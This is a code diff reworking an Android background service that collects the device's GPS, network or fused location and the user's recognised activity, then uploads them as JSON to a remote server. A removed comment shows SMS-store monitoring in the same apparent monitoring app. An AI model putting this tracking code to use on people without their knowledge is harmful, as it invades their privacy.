@@ -1,22 +1,16 @@
 package com.inet.android.location;
 
 import java.text.SimpleDateFormat;
-import java.util.Calendar;
 import java.util.Iterator;
 import java.util.List;
 import java.util.Locale;
 
-import org.json.JSONArray;
 import org.json.JSONException;
 import org.json.JSONObject;
 
-import android.app.AlarmManager;
-import android.app.PendingIntent;
 import android.app.Service;
 import android.content.Context;
 import android.content.Intent;
-import android.content.SharedPreferences;
-import android.content.SharedPreferences.Editor;
 import android.location.GpsSatellite;
 import android.location.GpsStatus;
 import android.location.Location;
@@ -27,161 +21,158 @@ import android.net.ConnectivityManager;
 import android.net.NetworkInfo;
 import android.os.Bundle;
 import android.os.IBinder;
-import android.preference.PreferenceManager;
+import android.util.Log;
 
+import com.google.android.gms.common.ConnectionResult;
+import com.google.android.gms.common.GooglePlayServicesUtil;
+import com.google.android.gms.common.api.GoogleApiClient;
+import com.google.android.gms.location.LocationRequest;
+import com.google.android.gms.location.LocationServices;
+import com.inet.android.request.ConstantValue;
 import com.inet.android.request.DataRequest;
 import com.inet.android.utils.ConvertDate;
 import com.inet.android.utils.Logging;
-import com.inet.android.utils.WorkTimeDefiner;
+import com.inet.android.utils.ValueWork;
 
+/**
+ * LocationTracker class is designed to monitoring location
+ * 
+ * @author johny homicide
+ * 
+ */
 public class LocationTracker extends Service implements GpsStatus.Listener,
-		LocationListener {
+		LocationListener, GoogleApiClient.ConnectionCallbacks,
+		GoogleApiClient.OnConnectionFailedListener,
+		com.google.android.gms.location.LocationListener {
 
-	private static final String TAG = "locationService";
-	LocationValue locationValue;;
-	ConvertDate date;
+	private static final String TAG = LocationTracker.class.getSimpleName()
+			.toString();
+	private LocationValue locationValue;;
 	private static final int SERVICE_REQUEST_CODE = 15;
 	// The minimum distance to change Updates in meters
-	private static final long MIN_DISTANCE_CHANGE_FOR_UPDATES = 10; // 100
-	float bestAccuracy = 1000; // meters
+	private static final long MIN_DISTANCE_CHANGE_FOR_UPDATES = 30; // 100
+	// A fast frequency ceiling in milliseconds
+	// Milliseconds per second
+	private static final int MILLISECONDS_PER_SECOND = 1000;
+	// Milliseconds per second
+	private static final int MILLISECONDS_PER_MINUTE = 60 * MILLISECONDS_PER_SECOND;
+	// Update frequency in seconds
+	public static final int UPDATE_INTERVAL_IN_SECONDS = 5;
+	// Update frequency in milliseconds
+	private static final long UPDATE_INTERVAL = MILLISECONDS_PER_MINUTE
+			* UPDATE_INTERVAL_IN_SECONDS;
 
 	// The minimum time between updates in milliseconds
-	private static long MIN_TIME_BW_UPDATES; // 5 minute
-	private static long MIN_TIME_BW_UPDATES1 = 1000 * 60 * 60 * 24; // 24 часа
+	private static long MIN_TIME_BW_UPDATES; // get minute
 	// Declaring a Location Manager
 	protected LocationManager locationManager;
+	// private LocationClient mLocationClient;
+	private LocationRequest mLocationRequest;
+	private GoogleApiClient googleApiClient;
 
-	private int timeUp = 0;
 	// flag for GPS status
-	boolean isGPSEnabled = false;
-	SharedPreferences sp;
+	private boolean isGPSEnabled = false;
 	// flag for network status
-	boolean isNetworkEnabled = false;
-	String bestProvider = null;
+	private boolean isNetworkEnabled = false;
 	// flag for GPS status
-	boolean canGetLocation = false;
 	private Context mContext;
-	Editor e;
-	Location location; // location
-	double latitude; // latitude
-	double longitude; // longitude
-	String locMetod;
-	String ID;
-	String nameId;
-	int minute;
-	String type = "9";
-
-	String provider = null;
-	StringBuilder sendStrings;
+	private Location location; // location
+	private int geoMode = -1;
 
 	@Override
 	public void onCreate() {
-		Logging.doLog(TAG, "onCreate() GPS", "onCreate() GPS");
+		Logging.doLog(TAG, "LocationTracker onCreate()",
+				"LocationTracker onCreate()");
 		mContext = getApplicationContext();
-		sp = PreferenceManager.getDefaultSharedPreferences(mContext);
+
 	}
 
 	@Override
 	public int onStartCommand(Intent intent, int flags, int startId) {
 		mContext = getApplicationContext();
-		sp = PreferenceManager.getDefaultSharedPreferences(mContext);
+		int timeUp = ValueWork.getMethod(
+				ConstantValue.TYPE_LOCATION_TRACKER_REQUEST, this);
+		geoMode = ValueWork
+				.getMethod(ConstantValue.LOCATION_TRACKER_MODE, this);
 		locationManager = (LocationManager) mContext
 				.getSystemService(LOCATION_SERVICE);
-		// contentObserved();
-		// ----------get geo time
-		// ---------------------------------------------------
-		Logging.doLog(TAG, "onStartCommand gpsTracker",
-				"onStartCommand gpsTracker");
-		if (sp.getString("geo", "5").equals("0")) {
+		// ----------get geo time ----------------------------
+		Logging.doLog(TAG, "time up " + timeUp + " geoMode " + geoMode,
+				"time up " + timeUp + " geoMode " + geoMode);
+
+		if (timeUp == 0) {
 			Logging.doLog(TAG, "Location Stop", "Location Stop");
-			locationManager.removeUpdates(this);
-			locationManager.removeGpsStatusListener(this);
+			stopLocationManager();
+			stopPlayService();
 			return 0;
 		}
-		MIN_TIME_BW_UPDATES = Integer.parseInt(sp.getString("geo", "5")) * 1000 * 60;
-		timeUp = Integer.parseInt(sp.getString("geo", "5"));
-		// ----------restart service
-		// ---------------------------------------------------
+		MIN_TIME_BW_UPDATES = timeUp * MILLISECONDS_PER_MINUTE;
+		Logging.doLog(TAG, "onStartCommand LocationTracker "
+				+ MIN_TIME_BW_UPDATES, "onStartCommand LocationTracker "
+				+ MIN_TIME_BW_UPDATES);
 
-		Calendar cal = Calendar.getInstance();
-		cal.add(Calendar.MINUTE, timeUp);// через 5 минут
-		PendingIntent servicePendingIntent = PendingIntent.getService(this,
-				SERVICE_REQUEST_CODE, new Intent(this, LocationTracker.class),// SERVICE_REQUEST_CODE
-																				// -
-																				// уникальный
-																				// int
-																				// сервиса
-				PendingIntent.FLAG_UPDATE_CURRENT);
+		// ----------restart service---------------------------------------
 
-		AlarmManager am = (AlarmManager) getSystemService(ALARM_SERVICE);
-		am.set(AlarmManager.RTC_WAKEUP, cal.getTimeInMillis(),
-				servicePendingIntent);
+		// Calendar cal = Calendar.getInstance();
+		// cal.add(Calendar.MINUTE, timeUp);// через 5 минут
+		// PendingIntent servicePendingIntent = PendingIntent.getService(this,
+		// SERVICE_REQUEST_CODE, new Intent(this, LocationTracker.class),//
+		// SERVICE_REQUEST_CODE
+		// // -
+		// // уникальный
+		// // int
+		// // сервиса
+		// PendingIntent.FLAG_UPDATE_CURRENT);
+		//
+		// AlarmManager am = (AlarmManager) getSystemService(ALARM_SERVICE);
+		// am.set(AlarmManager.RTC_WAKEUP, cal.getTimeInMillis(),
+		// servicePendingIntent);
 		// ----------is work ---------------------------------------------------
 
-		boolean isWork = WorkTimeDefiner.isDoWork(getApplicationContext());
-		if (!isWork) {
-			Logging.doLog(TAG, "isWork return " + Boolean.toString(isWork),
-					"isWork return " + Boolean.toString(isWork));
-			return 0;
+		locationValue = new LocationValue();
+
+		if (!servicesAvailable()) {
+			Logging.doLog(TAG, "!servicesAvailable() ", "!servicesAvailable() ");
+			stopPlayService();
+			setOnLocationManager();
 		} else {
-			Logging.doLog(TAG, Boolean.toString(isWork),
-					Boolean.toString(isWork));
+			Logging.doLog(TAG, "createApiGoogle() ", "createApiGoogle() ");
+			stopLocationManager();
+			createApiGoogle();
+
 		}
-		getLocation();
 		super.onStartCommand(intent, flags, startId);
 		return Service.START_STICKY;
 	}
 
-	public Location getLocation() {
+	private Location setOnLocationManager() {
 		try {
 			Logging.doLog(TAG, "GetLocation ", "GetLocation ");
-			date = new ConvertDate();
-			locationValue = new LocationValue();
 
-			// --------------- getting GPS
-			// status-------------------------------------------
+			// --------------- getting GPS status-----------------
 			isGPSEnabled = locationManager
 					.isProviderEnabled(LocationManager.GPS_PROVIDER);
 
-			Logging.doLog(TAG, "isGPS " + Boolean.toString(isGPSEnabled),
-					"isGPS " + Boolean.toString(isGPSEnabled));
-
-			// --------------- getting network
-			// status--------------------------------------
+			// --------------- getting network status-------------
 			isNetworkEnabled = locationManager
 					.isProviderEnabled(LocationManager.NETWORK_PROVIDER);
 
-			Logging.doLog(TAG,
-					"isNetwork " + Boolean.toString(isNetworkEnabled),
-					"isNetwork " + Boolean.toString(isNetworkEnabled));
-			// --------------- getting geo_mode
-			// --------------------------------------------
+			// --------------- getting geo_mode ------------------
 
-			if ((sp.getString("geo_mode", "1").equals("1")) && isGPSEnabled) {
-
-				locationValue.setGPSLocation(true);
+			if (geoMode == 1 && isGPSEnabled) {
 				Logging.doLog(TAG, "GPS set true ", "GPS set true ");
-
+				locationValue.setGPSLocation(true);
 			} else {
-				Logging.doLog(TAG,
-						"GPS set false " + sp.getString("geo_mode", "1"),
-						"GPS set false " + sp.getString("geo_mode", "1"));
 				locationValue.setGPSLocation(false);
 				locationManager.removeGpsStatusListener(this);
-				
-				// locationManager.removeNmeaListener(this);
-
 			}
-			// --------------- getting location
-			// method---------------------------------------
+			// --------------- getting location method-------------
 
-			if (!isGPSEnabled && !locationValue.getGPSLocation()) {
+			if (!isGPSEnabled && !isNetworkEnabled) {
 				// no network provider is enabled
 				Logging.doLog(TAG, "!isGPS&&isNetwork ", "!isGPS&&isNetwork ");
 				return null;
 			} else {
-				this.canGetLocation = true;
-				// if Network Enabled get lat/long using GPS Services
 				if (isOnline() == true) {
 					Logging.doLog(TAG, "Network isOnline ", "Network isOnline ");
 					if (isNetworkEnabled == true) {
@@ -190,18 +181,15 @@ public class LocationTracker extends Service implements GpsStatus.Listener,
 				}
 				if (locationValue.getGPSLocation() == true) {
 					Logging.doLog(TAG, "GPS Enabled", "GPS Enabled");
-					gpsLoc();
 					locationManager.addGpsStatusListener(this);
-					// locationManager.addNmeaListener(this);
-
+					gpsLoc();
 				}
-				getLast();
 			}
 
 		} catch (Exception e) {
 			e.printStackTrace();
 		}
-
+		getLast();
 		return location;
 	}
 
@@ -211,59 +199,63 @@ public class LocationTracker extends Service implements GpsStatus.Listener,
 		SimpleDateFormat TIMESTAMP = new SimpleDateFormat(
 				"yyyy-MM-dd HH:mm:ss", Locale.getDefault());
 		Location bestResult = null;
+		String bestProvider = null;
+		double latitude = 0; // latitude
+		double longitude = 0; // longitude
+
 		float accuracy;
 		long time;
 		long bestTime = 0;
 		float bestAccuracy = 1000;
 		long minTime = 0;
 		List<String> matchingProviders = locationManager.getAllProviders();
+		matchingProviders.add("GooglePlayService");
 		Logging.doLog(TAG, "LocMan " + matchingProviders.toString(), "LocMan "
 				+ matchingProviders.toString());
-		sendStrings = new StringBuilder();
+
 		for (String provider : matchingProviders) {
-			location = locationManager.getLastKnownLocation(provider);
+			if (provider.equals("GooglePlayService"))
+				if (googleApiClient != null && locationValue.isLocationClient())
+					location = LocationServices.FusedLocationApi
+							.getLastLocation(googleApiClient);
+				else
+					location = locationManager.getLastKnownLocation(provider);
 
 			if (location != null) {
+
 				accuracy = location.getAccuracy();
 				time = location.getTime();
 
 				// Выводим Дату по шаблону
 				String date2 = TIMESTAMP.format(time);
-				Logging.doLog(TAG, "last update " + provider + " " + date2,
-						"last update " + provider + " " + date2);
+				Logging.doLog(TAG, "last update " + provider + " " + date2
+						+ " accuracy" + accuracy, "last update " + provider
+						+ " " + date2 + " accuracy" + accuracy);
 				long timeSys = System.currentTimeMillis();
-				minTime = timeSys - MIN_TIME_BW_UPDATES1;
-
-				Logging.doLog(TAG, "time + accuracy " + Long.toString(time)
-						+ " " + Float.toString(accuracy), "time + accuracy "
-						+ Long.toString(time) + " " + Float.toString(accuracy));
+				minTime = timeSys - UPDATE_INTERVAL;
 				if ((time > minTime && accuracy < bestAccuracy)) {
 					bestResult = location;
-					longitude = location.getLongitude();
-					latitude = location.getLatitude();
+					longitude = bestResult.getLongitude();
+					latitude = bestResult.getLatitude();
 					bestAccuracy = accuracy;
 					bestTime = time;
 					bestProvider = provider;
-					// Выводим Дату по шаблону
-					String date1 = TIMESTAMP.format(bestTime);
-					Logging.doLog(TAG, "bestAccuracy: " + date1 + " "
-							+ accuracy + " " + bestResult, "bestAccuracy: "
-							+ date1 + " " + accuracy + " " + bestResult);
 				} else if (time < minTime && bestAccuracy == Float.MAX_VALUE
 						&& time > bestTime) {
 					bestResult = location;
 					bestTime = time;
 					bestProvider = provider;
 					bestAccuracy = accuracy;
-					longitude = location.getLongitude();
-					latitude = location.getLatitude();
-					Logging.doLog(TAG, "else " + Long.toString(bestTime) + " "
-							+ bestResult, "else " + Long.toString(bestTime)
-							+ " " + bestResult);
+					longitude = bestResult.getLongitude();
+					latitude = bestResult.getLatitude();
 				}
 			}
 
 		}
+		Logging.doLog(TAG, "bestProvider " + bestProvider + " best time: "
+				+ bestTime + " best accuracy " + bestAccuracy, "bestProvider "
+				+ bestProvider + " best accuracy" + bestAccuracy);
+
 		locationValue.setProvider(bestProvider);
 		locationValue.setLatitude(latitude);
 		locationValue.setLongitude(longitude);
@@ -281,53 +273,47 @@ public class LocationTracker extends Service implements GpsStatus.Listener,
 		return false;
 	}
 
-	public void netLoc() {
+	private void netLoc() {
 		// locMetod = "network";
 		locationManager.requestLocationUpdates(
 				LocationManager.NETWORK_PROVIDER, MIN_TIME_BW_UPDATES,
 				MIN_DISTANCE_CHANGE_FOR_UPDATES, this);
-		Logging.doLog(TAG, "Network Location", "Network Location");
-
 	}
 
-	public void gpsLoc() {
+	private void gpsLoc() {
 		// locMetod = "network";
 		locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER,
 				MIN_TIME_BW_UPDATES, MIN_DISTANCE_CHANGE_FOR_UPDATES, this);
-		Logging.doLog(TAG, "GPS Location", "GPS Location");
-
 	}
 
-	public void sendLoc() {
-		Logging.doLog(
-				TAG,
-				Double.toString(locationValue.getLatitude())
-						+ Double.toString(locationValue.getLongitude()),
-				Double.toString(locationValue.getLatitude())
-						+ Double.toString(locationValue.getLongitude()));
+	private void sendLoc() {
 		if (Double.toString(locationValue.getLatitude()) == "0.0"
 				&& Double.toString(locationValue.getLongitude()) == "0.0") {
 			Logging.doLog(TAG, "equals = 0.0", "equals = 0.0");
 
 		} else {
-
-			// -------send sms----------------------------
+			// -------send location----------------------------
 			String sendJSONStr = null;
-			JSONObject jsonObject = new JSONObject();
-			JSONArray data = new JSONArray();
 			JSONObject info = new JSONObject();
 			JSONObject object = new JSONObject();
 			try {
+				// String activity = sp.getString("activity", "0");
+				String activity = RecognitionDevService.getActivityDevice();
+				Logging.doLog(TAG, "activity" + activity, "activity" + activity);
 
-				info.put("ttl", locationValue.getProvider());
+				if (activity != null && !activity.equals(""))
+					info.put("ttl", locationValue.getProvider() + " " + " "
+							+ activity);
+				else
+					info.put("ttl", locationValue.getProvider());
 				info.put("data", locationValue.getLatitude() + ","
 						+ locationValue.getLongitude());
-				info.put("accuracy", locationValue.getAccuracy());
-				object.put("time", date.logTime());
-				object.put("type", type);
+				info.put("accuracy",
+						String.format("%.02f", locationValue.getAccuracy()));
+				object.put("time", ConvertDate.logTime());
+				object.put("type", ConstantValue.TYPE_LOCATION_TRACKER_REQUEST);
 				object.put("info", info);
-//				data.put(object);
-//				jsonObject.put("data", data);
+
 				sendJSONStr = object.toString();
 			} catch (JSONException e) {
 				Logging.doLog(TAG, "json сломался", "json сломался");
@@ -337,13 +323,7 @@ public class LocationTracker extends Service implements GpsStatus.Listener,
 			dr.sendRequest(sendJSONStr);
 
 			Logging.doLog(TAG, sendJSONStr, sendJSONStr);
-			Logging.doLog(TAG, sendJSONStr);
-
 		}
-	}
-
-	public void sendNoLoc() {
-		Logging.doLog(TAG, "No location", "No location");
 	}
 
 	/**
@@ -354,27 +334,15 @@ public class LocationTracker extends Service implements GpsStatus.Listener,
 	@Override
 	public void onLocationChanged(Location location) {
 		if (location != null) {
-			if (Double.toString(location.getLatitude()) == "0.0"
-					&& Double.toString(location.getLongitude()) == "0.0") {
-				if (location.getProvider() == "gps")
-					if (locationValue.getGPSLoc()) {
-						Logging.doLog(TAG,
-								"loc change" + location.getProvider(),
-								"loc change  " + location.getProvider());
-						locationValue.setProvider(location.getProvider());
-						locationValue.setLatitude(location.getLatitude());
-						locationValue.setLongitude(location.getLongitude());
-						locationValue.setAccuracy(location.getAccuracy());
-					}
-			} else {
-				Logging.doLog(TAG, "loc change" + location.getProvider(),
-						"loc change  " + location.getProvider());
+			if (location.getProvider().equals("fused"))
+				locationValue.setProvider("GooglePlayService");
+			else
 				locationValue.setProvider(location.getProvider());
-				locationValue.setLatitude(location.getLatitude());
-				locationValue.setLongitude(location.getLongitude());
-				locationValue.setAccuracy(location.getAccuracy());
-			}
+			locationValue.setLatitude(location.getLatitude());
+			locationValue.setLongitude(location.getLongitude());
+			locationValue.setAccuracy(location.getAccuracy());
 		}
+
 	}
 
 	@Override
@@ -402,7 +370,6 @@ public class LocationTracker extends Service implements GpsStatus.Listener,
 		case LocationProvider.AVAILABLE:
 			Logging.doLog(TAG, "Status Changed: Available",
 					"Status Changed: Available");
-
 			break;
 		}
 	}
@@ -411,14 +378,6 @@ public class LocationTracker extends Service implements GpsStatus.Listener,
 	public IBinder onBind(Intent arg0) {
 		return null;
 	}
-
-	// public void contentObserved() {
-	// if (smsSentObserver == null) {
-	// smsSentObserver = new SmsSentObserver(new Handler(), mContext);
-	// mContext.getContentResolver().registerContentObserver(
-	// Uri.parse("content://sms"), true, smsSentObserver);
-	// }
-	// }
 
 	@Override
 	public void onGpsStatusChanged(int event) {
@@ -467,5 +426,81 @@ public class LocationTracker extends Service implements GpsStatus.Listener,
 			locationValue.setGPSFix(false);
 			break;
 		}
+	}
+
+	@Override
+	public void onConnectionFailed(ConnectionResult connectionResult) {
+		// TODO Auto-generated method stub
+		locationValue.setLocationClient(false);
+
+	}
+
+	@Override
+	public void onConnected(Bundle arg0) {
+		// TODO Auto-generated method stub
+		Logging.doLog(TAG, "Connected to Google Play Services.",
+				"Connected to Google Play Services.");
+		mLocationRequest = LocationRequest.create()
+				.setInterval(MIN_TIME_BW_UPDATES)
+				.setFastestInterval(MILLISECONDS_PER_MINUTE);
+		Logging.doLog(TAG, "geomode setPrioity" + geoMode, "geomode setPrioity"
+				+ geoMode);
+		if (geoMode == 1)
+			mLocationRequest
+					.setPriority(LocationRequest.PRIORITY_HIGH_ACCURACY);
+		else
+			mLocationRequest
+					.setPriority(LocationRequest.PRIORITY_BALANCED_POWER_ACCURACY);
+
+		Logging.doLog(TAG, "connect locationClient", "connect locationClient");
+		LocationServices.FusedLocationApi.requestLocationUpdates(
+				googleApiClient, mLocationRequest, this);
+		locationValue.setLocationClient(true);
+		getLast();
+
+	}
+
+	private void createApiGoogle() {
+		googleApiClient = new GoogleApiClient.Builder(this)
+				.addApi(LocationServices.API).addConnectionCallbacks(this)
+				.addOnConnectionFailedListener(this).build();
+		googleApiClient.connect();
+	}
+
+	private boolean servicesAvailable() {
+
+		int resultCode = GooglePlayServicesUtil
+				.isGooglePlayServicesAvailable(this);
+		if (ConnectionResult.SUCCESS == resultCode) {
+			Log.d(TAG, "Google Play services is available.");
+			return true;
+		}
+		Log.e(TAG, "Google Play services NOT available.");
+		return false;
+	}
+
+	private void stopPlayService() {
+		Log.d(TAG, "stopPlayService()");
+		if (LocationServices.FusedLocationApi != null
+				&& googleApiClient != null) {
+			locationValue.setLocationClient(false);
+			LocationServices.FusedLocationApi.removeLocationUpdates(
+					googleApiClient, this);
+			googleApiClient.disconnect();
+		}
+	}
+
+	private void stopLocationManager() {
+		if (locationManager != null) {
+			locationManager.removeUpdates(this);
+			locationManager.removeGpsStatusListener(this);
+		}
+	}
+
+	@Override
+	public void onConnectionSuspended(int arg0) {
+		// TODO Auto-generated method stub
+		locationValue.setLocationClient(false);
+
 	}
 }
